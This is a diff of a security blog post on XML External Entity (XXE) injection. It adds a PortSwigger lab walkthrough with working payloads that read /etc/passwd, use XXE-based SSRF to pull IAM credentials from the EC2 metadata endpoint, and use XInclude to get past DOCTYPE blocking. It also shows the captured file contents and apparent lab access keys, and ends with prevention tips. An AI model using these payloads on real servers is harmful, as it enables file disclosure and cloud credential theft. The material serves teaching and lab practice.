@@ -7,21 +7,19 @@ author: Ren Sie
 comments: true
 category: injection
 ---
-
-By default, XML has predefined entities to represent special symbols (like `&lt;` for `<`), but **XML External Entities (XXE)** allow users to define **custom entities**. These custom entities can reference external resources, such as local files or URLs. This flexibility can be exploited to read sensitive files on the server, or run RCE.  
 The method isn’t as popular as others because of the patches. But if comes across with application that access and passing XML, worth trying!
 
 {: .box-note}
 **Note:** 💡 Try pass XML data to API endpoint. They sometimes accept XML data besides JSON data.
 
-## XML
+### XML
 Some Apps use XML to transfer data. XML has its default entities, which define the way of representing data or special characters. For instance: 
 - `&amp;` → `&`
 - `&lt;` → `<`
 - `&gt;` → `>`
 
-### **External Entities**
-These are custom-defined entities that reference external resources, such as _local files_ or _external URLs_. Thus, we can use this function to read file and RCE.
+#### **External Entities**
+By default, XML has predefined entities to represent special symbols (like `&lt;` for `<`), but **XML External Entities (XXE)** allow users to define **custom entities**. These custom entities can reference **external resources**, such as _local files_ or _external URLs_. This flexibility can be exploited to read sensitive files on the server, or run RCE.  
 They can be defined using the `<!ENTITY>` syntax in XML like this:
 ~~~
 xml:
@@ -38,7 +36,108 @@ xml:
 <creds><user>&xxe;</user><password>pass</password></creds>
 ~~~
 
-## Prevention
+### Labs
+Just for demostration, I completed some labs on [PortSwigger Academy](https://portswigger.net/web-security/all-labs#xml-external-entity-xxe-injection) to show how this vulnerability can lead to:
+1. Exploiting XXE using external entities to retrieve files
+   I captured and modified `POST /product/stock` with Burp Repeater. Adding the `!DOCTYPE element` that defines an external entity containing the path to the file `etc/passwd`.
+   ~~~
+   <?xml version="1.0" encoding="UTF-8"?>  
+   <!DOCTYPE test [  
+   <!ENTITY xxe SYSTEM "file:///etc/passwd">  
+   ]>  
+   <stockCheck><productId>&xxe;</productId><storeId>2</storeId></stockCheck>  
+   ~~~
+   > Response:  
+   > "Invalid product ID: root:x:0:0:root:/root:/bin/bash  
+   > daemon:x:1:1 : daemon :/usr/sbin:/usr/sbin/nologin  
+   > bin:x: 2:2 :bin:/bin:/usr/sbin/nologin  
+   > sys:x: 3:3 : sys : /dev:/usr/sbin/nologin  
+   > sync:x: 4:65534 : sync:/bin:/bin/sync  
+   > www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin  
+   > backup:x: 34:34 :backup:/var/backups:/usr/sbin/nologin  
+   > apt:x:100:65534 :: /nonexistent:/usr/sbin/nologin  
+   > peter:x:2001:2001 :: /home/peter:/bin/bash  
+   > dnsmasq:x:101:65534 :dnsmasq, ,,:/var/lib/misc:/usr/sbin/nologin  
+   > messagebus:x:102:101 :: /nonexistent:/usr/sbin/nologin
+   
+2. Exploiting XXE to perform SSRF attacks
+   I captured and modified `POST /product/stock` with Burp Repeater. Adding the `!DOCTYPE element` that defines an external entity `test` to access EC2 instance metadata. More details about what _EC2 instance metadata_ is, visit [Access instance metadata for an EC2 instance](https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/instancedata-data-retrieval.html)
+   ~~~
+   < ?xml version="1.0" encoding="UTF-8"?>  
+   < !DOCTYPE test [  
+   < !ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data">  
+   ]>  
+   < <stockCheck><productId>&xxe;</productId><storeId>3</storeId></stockCheck>  
+   ~~~
+   > Response: It tells us there's an "iam" entity inside  
+   > "Invalid Product ID:  
+   > iam"
+   
+   ~~~
+   < ?xml version="1.0" encoding="UTF-8"?>  
+   < !DOCTYPE test [  
+   < !ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam">  
+   ]>
+   < <stockCheck><productId>&xxe;</productId><storeId>3</storeId></stockCheck>
+   ~~~
+   > Response: It tells us there's an "security-credentials" entity inside  
+   > "Invalid Product ID:  
+   > security-credentials"
+
+   ~~~
+   < ?xml version="1.0" encoding="UTF-8"?>  
+   < !DOCTYPE test [  
+   < !ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin">  
+   ]>  
+   < <stockCheck><productId>&xxe;</productId><storeId>3</storeId></stockCheck>  
+   ~~~
+   > Response: It tells us there's an "admin" entity inside  
+   > "Invalid Product ID:  
+   > admin"  
+   
+   ~~~
+   < ?xml version="1.0" encoding="UTF-8"?>  
+   < !DOCTYPE test [  
+   < !ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin">  
+   ]>  
+   < <stockCheck><productId>&xxe;</productId><storeId>3</storeId></stockCheck>  
+   ~~~
+   > Response: We retrieves admin's access key
+   > "Code":"Success",  
+   > "LastUpdated":"2021-11-15T11:29:31.956206Z",  
+   > "Type":"AWS-HMAC",  
+   > "AccessKeyId":"BordnBx2QrCdt7VGVWT3",  
+   > "SecretAccessKey":"yBZJPYWjn4XFnBLk3fqe305Fqdc7YT3SUs4vomxF",  
+   > "Token":"kMW7yE0Z00lCE8zoDhS1rjX0vRBQG0EepbmRtzxmyzW0g8QtJ4j",  
+   > "Expiration":"2027-11-14T11:29:31.956206Z"  
+
+{: .box-note}
+**Note:** 💡SSRF exploits a server's request-making functionality, allowing user to make a crafted request that pivots from the public-facing application and uses the server's trusted internal network position to scan, access, and exfiltrate data from otherwise unreachable backend services and cloud metadata endpoints.
+
+3. Exploiting XInclude to retrieve files
+   I identified the server-side xml parser by studying `GET /product?productId=3` on Burp Proxy. Insert the `Xinclude namespace` and the filepath to `POST /product/stock` on Repeater.
+   ~~~
+   productId=<test  
+   xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/>  
+   </test>&storeId=2
+   ~~~
+   > Response:  
+   > "Invalid product ID: root:x:0:0:root:/root:/bin/bash  
+   > daemon:x:1:1 : daemon :/usr/sbin:/usr/sbin/nologin  
+   > bin:x: 2:2 :bin:/bin:/usr/sbin/nologin  
+   > sys:x: 3:3 : sys : /dev:/usr/sbin/nologin  
+   > sync:x: 4:65534 : sync:/bin:/bin/sync  
+   > www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin  
+   > backup:x: 34:34 :backup:/var/backups:/usr/sbin/nologin  
+   > apt:x:100:65534 :: /nonexistent:/usr/sbin/nologin  
+   > peter:x:2001:2001 :: /home/peter:/bin/bash  
+   > dnsmasq:x:101:65534 :dnsmasq, ,,:/var/lib/misc:/usr/sbin/nologin  
+   > messagebus:x:102:101 :: /nonexistent:/usr/sbin/nologin
+
+{: .box-note}
+**Note:** 💡XInclude is used to bypass DTD-based Mitigation in this instance, If the application is blocking <!DOCTYPE>, an XInclude might still succeed.
+
+### Prevention
 1. Disable XML external entity
 2. Use JSON instead of XML
 3. Validate and Sanitize XML Input (with XSD)
